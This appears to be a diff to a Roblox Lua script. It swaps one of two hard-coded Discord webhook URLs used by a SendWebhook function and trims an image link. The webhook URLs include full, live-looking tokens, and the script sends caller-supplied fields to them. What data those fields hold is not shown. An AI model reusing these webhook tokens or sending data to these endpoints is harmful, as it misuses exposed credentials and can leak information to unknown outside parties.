@@ -12,7 +12,7 @@ local CoreGui = game:GetService("CoreGui")
 
 local WEBHOOKS = {
     "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB", -- WEBHOOK 1
-    "https://discord.com/api/webhooks/1445229773415780439/Sjj4A7EwrGeY7RuZ-nTwhkIqNNXBkbaVA3GqdK4gLzN5eA-TKV_XPgsdte1rsN_qj2JL",  --WEBHOOK 2
+    "https://discord.com/api/webhooks/1435969755747061903/NaYQn7FQaT4PmvtuVBa_P3lZveoO-8iYfbRm-ZLzmkds8ElMDDDfnbQbc-04A4SBnw_D",  --WEBHOOK 2
 }
 
 --========================================================--
@@ -120,7 +120,7 @@ local function SendWebhook(extraFields)
             color = 16732240,
             fields = extraFields,
             image = {
-                url = "https://cdn.discordapp.com/attachments/1445217512235995216/1445225178228457595/1660655429_windows_12_-_3.png?ex=692f9255&is=692e40d5&hm=0963370b10413cb27f720515b2871da18bdd3be3bd6ad9c00a8292946cfa85f6&"
+                url = "https://cdn.discordapp.com/attachments/1445217512235995216/1445225178228457595/1660655429_windows_12_-_3.png?ex=692f9255&is=692e40d5&hm=0963370b10413cb27f720515b2871da18bdd3be3bd6ad9c00a8292946cfa85f6"
             }
         }}
     }
